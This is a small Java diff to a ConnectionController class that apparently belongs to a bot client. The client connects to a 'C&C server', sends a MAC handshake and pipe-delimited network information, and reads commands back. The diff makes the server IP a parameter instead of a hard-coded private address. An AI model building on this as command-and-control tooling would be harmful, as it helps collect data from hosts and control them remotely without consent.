@@ -17,7 +17,7 @@ public class ConnectionController {
 
 	//====== THE CONSTANTS YOU MIGHT WANNA CHANGE ======//
 	
-	private static InetAddress SERVER_IP; // Hard code IP for now
+	private static InetAddress SERVER_IP;
 	private static short DEFAULT_PORT = 9000; // the TCP port the server listens on
 	private static int UDP_PORT_TO_SEND_FROM = 15000;
 	private static int RECONNECT_INTERVAL_SECONDS = 10;
@@ -37,10 +37,10 @@ public class ConnectionController {
 	 * 
 	 * @return A buffered reader with commands from server
 	 */
-	public BufferedReader connectToServer(){
+	public BufferedReader connectToServer(String server_ip){
 		// from here we get the command from the C&C server
 		try {
-			SERVER_IP = InetAddress.getByName("10.16.172.9");
+			SERVER_IP = InetAddress.getByName(server_ip);
 		} catch (UnknownHostException e1) {
 			System.out.println("Could not resolve server ip to InetAddress");
 			e1.printStackTrace();
@@ -59,7 +59,7 @@ public class ConnectionController {
 			}
 		}
 		
-		System.out.println("tcp initialized, now sending create"); // useless shit protocol HAVE TO BE MITIGATED!!! 
+		System.out.println("tcp initialized"); // useless shit protocol HAVE TO BE MITIGATED!!! 
 		
 		// OUR PROTOCOL HANDSHAKE / WHATEVA
 		con.sendTCP("mac\n");
@@ -97,10 +97,13 @@ public class ConnectionController {
 	 */
 	public void sendArrayTCP(ArrayList<String[]> arrList){
 		for (String[] array : arrList){
+			System.out.println("array length "+ array.length);
+			String networkInfo = "";
 			for (String str : array){
-				System.out.println("array string sent : " + str);
-				con.sendTCP(str + "\n");
+				networkInfo += str + "|";
 			}
+			System.out.println(networkInfo);
+			con.sendTCP(networkInfo+"\n");
 		}
 		System.out.println("TCParray sent");
 	}
